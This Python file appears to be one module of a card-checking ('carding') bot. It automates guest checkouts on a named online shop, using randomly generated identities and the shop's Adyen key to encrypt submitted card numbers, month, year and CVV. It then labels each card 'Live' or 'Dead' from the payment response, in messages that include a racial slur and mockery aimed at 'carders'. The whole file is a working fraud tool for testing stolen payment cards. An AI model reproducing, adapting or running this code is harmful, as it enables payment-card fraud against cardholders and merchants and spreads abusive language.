from FUNC.GATES.ADYEN.py_adyen_encrypt import encryptor
from FUNC.GATES.ADYEN.func.userinfo import RandUser
import requests
from FUNC.usersdb_func import *

def password():
    import secrets
    import string
    letters = string.ascii_letters
    digits = string.digits
    special_chars = string.punctuation
    alphabet = letters + digits + special_chars
    pwd_length = 12
    pwd = ''
    for i in range(pwd_length):
        pwd += ''.join(secrets.choice(alphabet))
    while True:
        pwd = ''
        for i in range(pwd_length):
            pwd += ''.join(secrets.choice(alphabet))

        if (any(char in special_chars for char in pwd) and 
            sum(char in digits for char in pwd)>=2):
                break
        return(pwd)

def find_between(data, first, last):
    try:
      start = data.index(first) + len(first)
      end = data.index(last, start)
      return data[start:end]
    except ValueError:
      return None

def adyen_enc(cc, mes, ano, cvv, ADYEN_KEY, adyen_version):
    enc = encryptor(ADYEN_KEY)
    enc.adyen_version = adyen_version
    enc.adyen_public_key = ADYEN_KEY
    card = enc.encrypt_card(card=cc, cvv=cvv, month=mes, year=ano)
    month = card['month']
    year = card['year']
    cvv = card['cvv']
    card = card['card']
    return card, month, year,cvv

def charge(input):
    cc = input.split("|")[0]
    mes = input.split("|")[1]
    ano = input.split("|")[2]
    cvv = input.split("|")[3]
    r = requests.Session()
    rand_user = RandUser().rand_user()
    a = r.get('https://www.beneoshop.com/hot-air-popcorn-maker-moviestar.html')
    form_key = find_between(a.text, 'form_key" type="hidden" value="','"')
    if not (form_key,a):
        return "First Request Error" "❌"
    b_data = {
'product': '178',
'selected_configurable_option': '',
'related_product': '',
'item': '178',
'form_key': form_key,
'product_page': 'true',
'qty': '1',
}
    b = r.post('https://www.beneoshop.com/amasty_cart/cart/add/', b_data, headers = {'x-requested-with': 'XMLHttpRequest'})
    if not b:
        return "Second Request Error" "❌"


    c = r.get('https://www.beneoshop.com/checkout/')
    entity_id = find_between(c.text, 'entity_id":"','"')
    if not (c, entity_id):
        return "Third Request Error" "❌"
    link = f'https://www.beneoshop.com/rest/en/V1/guest-carts/{entity_id}/'
    
    d_data = {
    "addressInformation": {
        "shipping_address": {
            "countryId": "FR",
            "regionCode": "",
            "region": "",
            "street": [
                "32 boulevard Albin Durand"
            ],
            "company": "",
            "telephone": rand_user['phone'],
            "postcode": "95800",
            "city": "Cergy",
            "firstname": rand_user['first_name'],
            "lastname": rand_user['last_name']
        },
        "billing_address": {
            "countryId": "FR",
            "regionCode": "",
            "region": "",
            "street": [
                "32 boulevard Albin Durand"
            ],
            "company": "",
            "telephone": rand_user['phone'],
            "postcode": "95800",
            "city": "Cergy",
            "firstname": rand_user['first_name'],
            "lastname": rand_user['last_name'],
            "saveInAddressBook": None
        },
        "shipping_method_code": "flexishipping",
        "shipping_carrier_code": "flexishipping",
        "extension_attributes": {
            "company_no": "",
            "tax_id": ""
        }
    }
}

    d = r.post(link + 'shipping-information', json = d_data)
    if not d :
        return "Fourth Request Error" "❌"

    api_key = "10001|9700D30E59217002696EAE765F068E26A637DAAAFB41D52C0F284799A27086BDCBFA3F0A973BAD595D0CB36FCE7F85605F1E5CA29265F241A0CC1F2B445081C07E9E5ED5A478B296208E8F68F0FDA56CFDF048EF51FD2E36328D7B21F33D69A0D3DB6634A2E3FFE7C6470988C866C01A07E5B6F907DEFFA0D167F0D4732D4B63CA73747B0BFCAE1F6D3431B3C1BA9E8A6C95DCCA646A07B6F1830E555A7C82E19BF228C0CAE67E231C5E47C044415AF99D9997A60CB1E97EBE0E380CBEECA7D199FFE8AC0BB020EAC15769C05B5B2A7BBF1C6CFFA1E319EA8E72F26AD70F74DFE7464019FE93ABB481D4BA2F6FA4742E8AF09073CAE183B28D436C9E9F58604F"

    card,month,year,cvc = adyen_enc(cc,mes,ano,cvv, api_key, "_0_1_25")

    e_data = {
    "cartId": entity_id,
    "billingAddress": {
        "countryId": "FR",
        "regionCode": "",
        "region": "",
        "street": [
            "32 boulevard Albin Durand"
        ],
        "company": "",
        "telephone": "2258945987",
        "postcode": "95800",
        "city": "Cergy",
        "firstname": rand_user['first_name'],
        "lastname": rand_user['last_name'],
        "saveInAddressBook": None
    },
    "paymentMethod": {
        "method": "adyen_cc",
        "additional_data": {
            "guestEmail": rand_user['email'],
            "cc_type": "VISA" if cc.startswith("3") else "MC",
            "number": card,
            "cvc": cvc,
            "expiryMonth": month,
            "expiryYear":year,
            "holderName": rand_user['first_name'],
            "store_cc": False,
            "number_of_installments": "",
            "java_enabled": False,
            "screen_color_depth": 24,
            "screen_width": 1366,
            "screen_height": 768,
            "timezone_offset": -330,
            "language": "en-GB",
            "combo_card_type": "credit"
        },
        "extension_attributes": {
            "agreement_ids": [
                "6",
                "7"
            ]
        }
    },
    "email": rand_user['email']
}
    e = r.post(link + 'payment-information', json = e_data,headers = {'x-requested-with': 'XMLHttpRequest'})
    if e.status_code != 200:
        if 'message' in e.json():
            message = e.json()['message']
            return message
        else:
            return e.text 
    else:
        return "CVV"

def getmassad(fullcc,user_id):
    try:
        result = charge(fullcc)
        if "CVV" in result:
            status = "Live 🟢"
            response = "CARD ATTACHED SUCCESSFULLY ✅"
        elif "AVS Declined" in result:
            status = "Live 🟢"
            response = "AVS DECLINED ✅"

        elif "insufficient_funds" in result or "card has insufficient funds." in result or "Not enough balance" in result:
            status = "Live 🟢"
            response = "LOW FUNDS ✅"

        elif "incorrect_cvc" in result or "security code is incorrect." in result or "Your card's security code is incorrect." in result or "Your card's security code is invalid." in result or "invalid_cvc" in result or "CVC Declined" in result:
            status = "Live 🟡"
            response = "CVC DECLINED ❎"

        elif "transaction_not_allowed" in result:
            status = "Live 🟡"
            response = "Card Doesn't Support Purchase ❎"

        elif '"cvc_check": "pass"' in result:
            status = "Live 🟢"
            response = "CVV LIVE ❎"

        elif "three_d_secure_redirect" in result or "card_error_authentication_required" in result:
            status = "Live 🟡"
            response = "3D Secure Redirected ❎"

        elif "stripe_3ds2_fingerprint" in result:
            status = "Live 🟡"
            response = "3D Secured ❎"

        elif "Your card does not support this type of purchase." in result:
            status = "Live 🟡"
            response = "Card Doesn't Support Purchase ❎"

        elif "generic_decline" in result or "You have exceeded the maximum number of declines on this card in the last 24 hour period." in result or "card_decline_rate_limit_exceeded" in result:
            status = "Dead 🔴"
            response = "𝐃𝐄𝐀𝐃 𝐂𝐀𝐑𝐃 𝐍𝐈𝐆𝐆𝐀! 💔❌"

        elif "do_not_honor" in result:
            status = "Dead 🔴"
            response = "𝐃𝐈𝐃 𝐍𝐎𝐓 𝐇𝐎𝐍𝐎𝐑 𝐘𝐎𝐔 𝐀𝐒 𝐀 𝐂𝐀𝐑𝐃𝐄𝐑 𝐋𝐌𝐀𝐎💔❌"

        elif "fraudulent" in result:
            status = "Dead 🔴"
            response = "Fraudulent 🚫"

        elif "stolen_card" in result:
            status = "Dead 🔴"
            response = "Stolen Card 🚫"

        elif "lost_card" in result:
            status = "Dead 🔴"
            response = "Lost Card 🚫"

        elif "pickup_card" in result:
            status = "Dead 🔴"
            response = "Pickup Card 🚫"

        elif "incorrect_number" in result:
            status = "Dead 🔴"
            response = "Incorrect Card Number 🚫"

        elif "Your card has expired." in result or "expired_card" in result:
            status = "Dead 🔴"
            response = "Expired Card 🚫"

        elif "intent_confirmation_challenge" in result:
            status = "Dead 🔴"
            response = "Captcha 😥"

        elif "Your card number is incorrect." in result:
            status = "Dead 🔴"
            response = "Incorrect Card Number 🚫"

        elif "Your card's expiration year is invalid." in result or "Your card\'s expiration year is invalid." in result:
            status = "Dead 🔴"
            response = "Expiration Year Invalid 🚫"

        elif "Your card's expiration month is invalid." in result or "invalid_expiry_month" in result:
            status = "Dead 🔴"
            response = "Expiration Month Invalid 🚫"

        elif "card is not supported." in result:
            status = "Dead 🔴"
            response = "Card Not Supported 🚫"

        elif "invalid_account" in result:
            status = "Dead 🔴"
            response = "Dead Card 🚫"

        elif "Invalid API Key provided" in result or "testmode_charges_only" in result or "api_key_expired" in result:
            status = "Dead 🔴"
            response = "SK DEAD 🚫"
            refundcredit(user_id)

        elif "Your card was declined." in result or "card was declined" in result:
            status = "Dead 🔴"
            response = "𝐃𝐄𝐀𝐃 𝐂𝐀𝐑𝐃 𝐍𝐈𝐆𝐆𝐀! 💔❌"

        else:
            status = "Dead 🔴"
            response = f"{result}"
            refundcredit(user_id)
        return (f"<code>{fullcc}</code>\n<b>𝐑𝐄𝐒𝐔𝐋𝐓 ⟿ {response}</b>\n")
    except Exception as e:
        with open("error_logs.txt", "a") as f:
            f.write(f"{e}\n")
